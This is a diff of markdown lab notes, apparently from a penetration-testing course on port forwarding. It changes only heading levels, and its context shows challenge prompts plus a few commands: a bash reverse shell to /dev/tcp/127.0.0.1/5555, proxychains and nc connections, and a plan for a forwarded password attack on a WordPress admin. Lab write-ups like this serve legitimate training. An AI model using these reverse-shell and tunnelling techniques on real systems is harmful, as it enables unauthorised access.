@@ -1,5 +1,5 @@
 
-###### 20.2.2.5
+# 20.2.2.5
 There is an internally hosted website on the target VM #1 which is reachable only from the server's **local address space**. Browse to this server to get the flag  
 
 ```bash
@@ -16,7 +16,7 @@ curl localhost:8080
   
 
   
-###### 20.2.4.4
+# 20.2.4.4
 The target VM #1 machine has an exploit that is triggered by root every minute that executes a basic _reverse shell_.  
 Unfortunately, that shell is trying to connect back to the internal port _5555_ on _127.0.0.1_ on that server, and the server has no tools available to catch this shell.  
 To solve this challenge, forward this reverse shell callback from the remote server to your local machine and then use this shell to read the flag.  
@@ -40,7 +40,7 @@ bash -i >& /dev/tcp/127.0.0.1/5555 0>&1
 
   
 
-###### 20.2.6.6
+# 20.2.6.6
 There is a service running on some TCP port in the range of _30000-35000_ on the target VM #1.  
 Find it, and you will find the flag. _Note_: scan takes a couple minutes  
 
@@ -66,7 +66,7 @@ proxychains nc -nvv 127.0.0.1 34023
   
 
   
-###### 20.2.6.7
+# 20.2.6.7
 There is a WordPress instance running on the target VM #2 that is only accessible locally.  
 The flag is not simply in a post once you log in - you need to use this administrative web to gain access to the box as _www-data_.  
 To save you time, the admin user is _offsec_. Use your local user SSH access to forward your password attack traffic to this server to determine the admin password.  
